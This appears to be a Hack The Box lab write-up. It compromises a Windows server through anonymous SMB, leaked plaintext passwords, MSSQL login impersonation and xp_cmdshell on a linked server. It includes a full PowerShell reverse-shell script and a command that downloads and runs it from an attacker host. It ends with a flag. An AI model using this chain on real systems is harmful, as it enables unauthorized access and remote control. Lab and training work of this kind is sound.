The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

## Question
1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
2. Enumerate the target and find a password for the user Fiona. What is her password?
3. Once logged in, what other user can we compromise to gain admin privileges?
4. Submit the contents of the flag.txt file on the Administrator Desktop.

## Solutions

```shell
> nmap -sC -sV 10.129.200.36
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3389/tcp open  ms-wbt-server Microsoft Terminal **Services**
 

> smbclient -N -L //10.129.200.36

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk
	IPC$            IPC       Remote IPC
> smbclient -N //10.129.200.36/HOME
smb> recurse on
smb> prompt off
smb> mget *

We can find 3 users and their files in the IT directory we just get. 

File of Simon: random.txt
```

```shell
We can now see in the Fiona s directory:
> cat creds.txt
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!

Let's brute force her account.
> nxc mssql 10.129.200.36 -u fiona -p fiona.txt
[+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl

Connect to mssql server:
> mssqlclient.py -windows-auth fiona:'48Ns72!bns74@S84NNNSl'@10.129.200.36


Lets see who we can impersonate:
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
john
simon

Impersonate john user in mssql DB
mssql> EXECUTE AS LOGIN = 'john'
mssql> SELECT SYSTEM_USER
mssql> SELECT IS_SRVROLEMEMBER('sysadmin')


Let's try to execute queries on linked server:

mssql> SELECT srvname, isremote FROM sysserver
srvname                 isremote
---------------------   --------
WINSRV02\SQLEXPRESS            1

LOCAL.TEST.LINKED.SRV          0


ENABLE COMMAND EXECUTION (WORKED FOR JOHN BUT NOT SIMON)
mssql> EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];

We can now execute a reverse shell:
1. Save reverse shell in shell.ps1:
   > cat shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.191',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

2. Set up nc listener on port 9001 and make this command on mssql:
> EXECUTE('xp_cmdshell ''echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.191:8000/shell.ps1") | powershell -noprofile''') AT [LOCAL.TEST.LINKED.SRV];


We get a reverse shell !

HTB{46u$!n9_l!nk3d_$3rv3r$}
```